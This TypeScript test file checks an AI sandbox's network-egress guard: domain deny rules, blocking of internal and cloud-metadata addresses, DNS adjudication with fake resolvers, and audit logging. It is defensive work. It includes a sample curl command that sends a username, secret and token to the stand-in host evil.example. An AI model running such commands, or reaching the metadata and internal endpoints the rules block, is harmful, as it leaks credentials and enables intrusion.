// © 2026 IHUI AI (智汇AI) · 版权所有者: 李春川 (Li Chunchuan) · https://aizhs.top
// Provenance-watermarked. 未授权商用可被溯源追责 (Apache-2.0 须保留本声明与 NOTICE)。
// [IHUI-AI-PROVENANCE]:⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠

/**
 * B6 子进程网络出口(复现 + 超越 WorkBuddy 的 DNS 域名裁决引擎)用例。
 * 超越轴在这里可验:对方要真驱动 / 真代理进程才能验,下面每一例都是**注入 fake** 的纯断言
 * (零网络、零真 DNS),且"护栏自身故障"单列一态(unjudged + 点名 + 下一步),
 * 而不是像对方钩子坏了 `catch {}` 静默降级。
 */

import { existsSync, readFileSync, rmSync } from 'node:fs';
import { join, parse } from 'node:path';
import { describe, it, expect } from 'vitest';

import { runSandboxed } from '../src/sandbox/index.js';
import { findProjectRoot } from '../src/runs/manifest.js';
import {
  EGRESS_ENV,
  judgeEgressTarget,
  normalizeEgressHost,
  domainLabelPath,
  type EgressPolicy,
  type EgressRule,
} from '../src/sandbox/egress/policy.js';
import { BUILTIN_EGRESS_POLICY } from '../src/sandbox/egress/builtin-rules.js';
import { resolveEgressPolicy } from '../src/sandbox/egress/policy-source.js';
import {
  adjudicateDomain,
  adjudicateEgressTargets,
  extractEgressTargets,
  type CommandLineTokenizer,
  type DomainResolver,
} from '../src/sandbox/egress/dns-adjudicator.js';
import { applyEgressEnvExit, buildEgressEnvExit } from '../src/sandbox/egress/env-inject.js';
import { appendEgressAuditRows, ledgerViolation, toAuditRow, FORBIDDEN_LEDGER_KEYS } from '../src/sandbox/egress/audit-ledger.js';

function policyOf(rows: readonly EgressRule[], over: Partial<EgressPolicy> = {}): EgressPolicy {
  return { rules: rows, defaultDecision: 'allow', addressProof: false, enforcement: 'advisory', source: 'test', ...over };
}
const denyRow = (domain: string, enforcement: EgressRule['enforcement'] = 'enforce'): EgressRule =>
  ({ id: `test:deny:${domain}`, domain, effect: 'deny', enforcement, why: 'test rule' });
const allowRow = (domain: string): EgressRule =>
  ({ id: `test:allow:${domain}`, domain, effect: 'allow', enforcement: 'advisory', why: 'test rule' });

describe('egress/policy — 三态成对(§0.3 缺输入不冒绿)', () => {
  it('① 命中 deny / 明确 allow / 判不了 unjudged', () => {
    const p = policyOf([denyRow('blocked.example'), allowRow('ok.example')]);
    expect(judgeEgressTarget('blocked.example', p).decision).toBe('deny');
    expect(judgeEgressTarget('ok.example', p).decision).toBe('allow');
    // 判不了的两型:没有目标 / 没有规则表。两型都必须点名并给下一步,不得回落成 allow。
    expect(judgeEgressTarget('   ', p)).toMatchObject({ decision: 'unjudged', reason: 'target-missing' });
    expect(judgeEgressTarget('   ', p).hint).toBeTruthy();
    expect(judgeEgressTarget('any.example', policyOf([]))).toMatchObject({ decision: 'unjudged', reason: 'policy-unavailable' });
    expect(judgeEgressTarget('any.example', null).decision).toBe('unjudged');
  });

  it('①b 取值认不出 ⇒ 落更严一侧并 warning(§0.10)', () => {
    const r = resolveEgressPolicy({ [EGRESS_ENV.default]: 'maybe', [EGRESS_ENV.enforce]: 'yes' });
    expect(r.policy.defaultDecision).toBe('deny');
    expect(r.policy.enforcement).toBe('enforce');
    expect(r.warnings).toHaveLength(2);
  });
});

describe('egress/policy — 内网网段正反对照', () => {
  it('② 私网/回环/元数据被拒,公网同一把尺放行;档位由声明决定', () => {
    const p = policyOf([denyRow('unused.example')], { enforcement: 'enforce' });
    for (const internal of ['10.0.0.5', '192.168.1.9', '127.0.0.1', '169.254.169.254', '172.16.0.1', 'fc00::1', 'fe80::1']) {
      expect(judgeEgressTarget(internal, p)).toMatchObject({ decision: 'deny', reason: 'internal-range' });
    }
    for (const publicIp of ['93.184.216.34', '8.8.8.8', '2606:4700:4700::1111']) {
      expect(judgeEgressTarget(publicIp, p).decision, publicIp).toBe('allow');
    }
    // advisory 档(默认)只出声不拦:同一个内网目标,blocked 由 enforcement 决定而非判据决定
    const advisory = policyOf([denyRow('unused.example')]);
    expect(judgeEgressTarget('10.0.0.5', advisory)).toMatchObject({ decision: 'deny', enforcement: 'advisory' });
  });

  it('②b 显式 allow 行排在前,内网名也能被机主点名放行(声明序即优先级)', () => {
    const r = resolveEgressPolicy({ [EGRESS_ENV.allowDomains]: 'db.internal' });
    expect(judgeEgressTarget('db.internal', r.policy).decision).toBe('allow');
    expect(judgeEgressTarget('other.internal', r.policy).decision).toBe('deny'); // 没点名的兄弟仍走内置族
  });
});

describe('egress/policy — 通配不越层(import glob-pattern,不抄第二份 glob→正则)', () => {
  it('③ * 只吃一层,** 吃任意深但不吃父层本身', () => {
    const single = policyOf([denyRow('*.example.com', 'advisory')]);
    expect(judgeEgressTarget('api.example.com', single).decision).toBe('deny');
    expect(judgeEgressTarget('a.b.example.com', single).decision).toBe('allow'); // 跨层 ⇒ 不命中
    const deep = policyOf([denyRow('**.example.com', 'advisory')]);
    expect(judgeEgressTarget('a.b.example.com', deep).decision).toBe('deny');
    expect(judgeEgressTarget('example.com', deep).decision).toBe('allow'); // 根层需单列(同既有 glob 语义)
    expect(judgeEgressTarget('example.com', policyOf([denyRow('example.com', 'advisory')])).decision).toBe('deny');
    expect(domainLabelPath('a.b.example.com')).toBe('com/example/b/a');
  });

  it('③b 内置内网族即刻生效(零配置也不冒充"没有出口限制")', () => {
    expect(BUILTIN_EGRESS_POLICY.rules.length).toBeGreaterThan(0);
    const r = resolveEgressPolicy({});
    for (const h of ['localhost', 'x.local', 'a.b.internal', 'metadata']) {
      expect(judgeEgressTarget(h, r.policy).decision, h).toBe('deny');
    }
  });
});

describe('egress/dns-adjudicator — 取词与解析都可注入 fake(零真网络)', () => {
  it('④ URL 取词只留主机名:凭据与查询串结构上进不了裁决面', () => {
    const tokenize = (): ReturnType<CommandLineTokenizer> => [
      { value: 'curl', expanded: false },
      { value: 'https://user:secret@evil.example/x?token=abc', expanded: false },
    ];
    const cmd = 'curl https://user:secret@evil.example/x?token=abc';
    expect(extractEgressTargets(cmd, tokenize)).toEqual([{ raw: 'evil.example', origin: 'url' }]);
    // 默认取词(复用 command-policy 的唯一分词器)也要给出同一结论
    expect(extractEgressTargets(cmd)).toEqual([{ raw: 'evil.example', origin: 'url' }]);
    expect(normalizeEgressHost('Evil.Example:8443')).toBe('evil.example');
    expect(normalizeEgressHost('[::1%eth0]')).toBe('::1');
  });

  it('④b 变量化参数 ⇒ unjudged target-unexpandable(不是"没目标")', () => {
    const rows = adjudicateEgressTargets('curl "$API_URL"', {
      policy: policyOf([denyRow('x.example')]),
      tokenize: () => [{ value: '$API_URL', expanded: true }],
    });
    expect(rows).toMatchObject([{ decision: 'unjudged', reason: 'target-unexpandable' }]);
  });

  it('⑤ 地址证据四态:内网 ⇒ deny / 公网 ⇒ allow / 判不了 ⇒ unjudged 且点名', () => {
    const proof = policyOf([denyRow('unused.example')], { addressProof: true });
    const host = 'front.example';
    expect(adjudicateDomain(host, { policy: proof, resolver: () => ['10.0.0.7'] }).decision).toBe('deny');
    expect(adjudicateDomain(host, { policy: proof, resolver: () => ['93.184.216.34'] }).decision).toBe('allow');
    const unwired = adjudicateDomain(host, { policy: proof });
    expect(unwired).toMatchObject({ decision: 'unjudged', reason: 'dns-resolver-unwired' });
    expect(unwired.hint).toContain('DomainResolver');
    expect(adjudicateDomain(host, { policy: proof, resolver: () => null }).reason).toBe('dns-lookup-failed');
    expect(adjudicateDomain(host, { policy: proof, resolver: () => [] }).reason).toBe('dns-no-answer');
    expect(adjudicateDomain(host, { policy: proof, resolver: () => { throw new Error('boom'); } }).reason).toBe('dns-resolver-threw');
    // deny 命中即止:名字已被规则表拒掉时绝不再问 DNS(不替对方做侦察)
    const boom: DomainResolver = () => { throw new Error('must not be called'); };
    const denied = adjudicateDomain('blocked.example', { policy: policyOf([denyRow('blocked.example')], { addressProof: true }), resolver: boom });
    expect(denied.reason).toBe('rule-deny');
  });
});

describe('egress/env-inject — env 出口形态 + 留痕形状', () => {
  const twoTargets = {
    commandLine: 'curl https://blocked.example/a https://ok.example/b',
    cwd: process.cwd(),
    env: { [EGRESS_ENV.denyDomains]: 'blocked.example', [EGRESS_ENV.allowDomains]: 'ok.example' },
    append: () => null,
  };

  it('⑥ 出口键形态:决策聚合、拒绝主机名、代理只在声明时点腿', () => {
    const exit = buildEgressEnvExit(twoTargets);
    expect(exit.aggregate).toBe('deny');
    expect(exit.blocked).toBe(true);
    expect(exit.env.IHUI_EGRESS_DECISION).toBe('deny');
    expect(exit.env.IHUI_EGRESS_DENIED_HOSTS).toBe('blocked.example');
    expect(exit.env.HTTP_PROXY).toBeUndefined(); // 没声明代理 ⇒ 这条腿不点,不假装执法
    const withProxy = buildEgressEnvExit({
      ...twoTargets,
      env: { ...twoTargets.env, [EGRESS_ENV.proxyUrl]: 'http://127.0.0.1:3128' },
    });
    expect(withProxy.env.HTTPS_PROXY).toBe('http://127.0.0.1:3128');
    expect(withProxy.env.NO_PROXY).toContain('ok.example');
    // 坏 URL 形态的代理声明 ⇒ 点名不点腿(失效方向是多要一次说明)
    const bad = buildEgressEnvExit({ ...twoTargets, env: { [EGRESS_ENV.proxyUrl]: 'not a url' } });
    expect(bad.env.HTTP_PROXY).toBeUndefined();
    expect(bad.warnings.join('\n')).toContain('IHUI_EGRESS_PROXY_URL');
  });

  it('⑥b 出口标记不被自家凭据 deny 表剥掉(顺序:先剥凭据、后并出口)', () => {
    const merged = applyEgressEnvExit({ SOME: '1', IHUI_API_KEY: undefined }, {
      policy: BUILTIN_EGRESS_POLICY, verdicts: [], aggregate: 'noop', blocked: false, blockReason: null,
      env: { IHUI_EGRESS_DECISION: 'noop' }, warnings: [], rows: [], ledger: { state: 'skipped', rows: 0, reason: 'no-rows' },
    });
    expect(merged).toMatchObject({ IHUI_EGRESS_DECISION: 'noop', SOME: '1' });
  });

  it('⑦ 留痕行形状:一行一裁决、无凭据字段、无 URL/查询串;不合格整批不落', () => {
    const exit = buildEgressEnvExit({
      commandLine: 'curl https://blocked.example/p?token=abc', cwd: process.cwd(),
      env: { [EGRESS_ENV.denyDomains]: 'blocked.example' },
      now: () => new Date('2026-11-05T00:00:00.000Z'), append: () => null,
    });
    const written: string[] = [];
    const outcome = appendEgressAuditRows(exit.rows, {
      startDir: process.cwd(), env: { [EGRESS_ENV.ledger]: 'state/egress-test.jsonl' },
      append: (_p, line) => { written.push(line); return null; },
    });
    expect(outcome.state).toBe('written');
    expect(written).toHaveLength(exit.rows.length);
    const parsed = JSON.parse(written[0]!) as Record<string, unknown>;
    expect(parsed).toMatchObject({ ts: '2026-11-05T00:00:00.000Z', target: 'blocked.example', decision: 'deny', reason: 'rule-deny', enforced: true });
    for (const key of Object.keys(parsed)) expect(FORBIDDEN_LEDGER_KEYS).not.toContain(key);
    expect(written[0]).not.toMatch(/token=|:\/\//);
    // 反向牙:有人把 URL 塞进 target ⇒ 整批拒写并点名
    const dirty = toAuditRow({ ...exit.verdicts[0]!, target: 'https://u:p@x.example/q?k=1' });
    expect(ledgerViolation(dirty)).toBe('forbidden-value:target');
    const rejected = appendEgressAuditRows([dirty], { startDir: process.cwd(), env: {}, append: () => null });
    expect(rejected.state).toBe('unjudged');
  });

  it('⑦b 台账写不成 / 取不到目录 ⇒ unjudged 点名,不静默丢(§0.3)', () => {
    const exit = buildEgressEnvExit({ commandLine: 'curl https://blocked.example/', cwd: process.cwd(), env: { [EGRESS_ENV.denyDomains]: 'blocked.example' }, append: () => null });
    expect(exit.rows.length).toBeGreaterThan(0);
    // 写失败:观测件不挡主流程,但必须点名(绝不记成"没有裁决发生")
    const failed = appendEgressAuditRows(exit.rows, { startDir: process.cwd(), env: {}, append: () => 'EPERM' });
    expect(failed).toMatchObject({ state: 'unjudged' });
    if (failed.state === 'unjudged') expect(failed.reason).toContain('ledger-write-failed:EPERM');
    // 目录取不到:从盘根往上找不到仓库根 ⇒ 显式未判定并给出补救键
    const noRoot = appendEgressAuditRows(exit.rows, { startDir: parse(process.cwd()).root, env: {}, append: () => null });
    if (noRoot.state === 'unjudged') expect(noRoot.reason).toContain('ledger-dir-unavailable');
    else expect(noRoot.state).toBe('written'); // 盘根上真挂着仓库根的那台机:落到 written 也算判过
    // 0 行不是"未判定",是"没发生":显式分档,免得把空集读成护栏坏了
    expect(appendEgressAuditRows([], { startDir: process.cwd(), env: {}, append: () => null }).state).toBe('skipped');
  });
});

describe('egress 接线锁 — 判据有真消费者(门 121 同口径:派生点就是消费者)', () => {
  it('⑧ 命中 enforce 档 deny ⇒ runSandboxed 不拉起子进程(blocked 形态与白名单一致)', () => {
    const root = findProjectRoot(process.cwd());
    expect(root).not.toBeNull();
    // 用例只写 gitignored 的临时落点,不污染真台账(§15);路径由仓库根推导,不硬编码。
    const ledger = join(root as string, '.ihui-agent', 'tmp', 'sandbox-egress-test', 'egress.jsonl');
    process.env[EGRESS_ENV.denyDomains] = 'egress-wired.test';
    process.env[EGRESS_ENV.ledger] = ledger;
    try {
      const blocked = runSandboxed('curl https://egress-wired.test/x', { cwd: process.cwd() });
      expect(blocked.blocked).toBe(true);
      expect(blocked.blockReason).toBe('egress_denied: egress-wired.test');
      expect(blocked.stdout).toBe(''); // 副作用没发生:没有任何命令输出
      expect(blocked.exitCode).toBeNull(); // 进程根本没起来
      // 正向对照:同一条路径、不含被拒目的地时照常执行(出口闸不是一刀切的红门)
      const pass = runSandboxed('echo b6-egress-ok', { cwd: process.cwd() });
      expect(pass.blocked).toBe(false);
      expect(pass.stdout.trim()).toBe('b6-egress-ok');
      // 消费者真的在写台账:命中过 deny 的这次派生必须留下一行
      const written = readFileSync(ledger, 'utf8').trim().split('\n');
      expect(written.some((line) => line.includes('egress-wired.test') && line.includes('"decision":"deny"'))).toBe(true);
    } finally {
      for (const key of [EGRESS_ENV.denyDomains, EGRESS_ENV.ledger]) delete process.env[key];
      if (existsSync(ledger)) rmSync(ledger, { force: true });
    }
  });
});
// ⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠
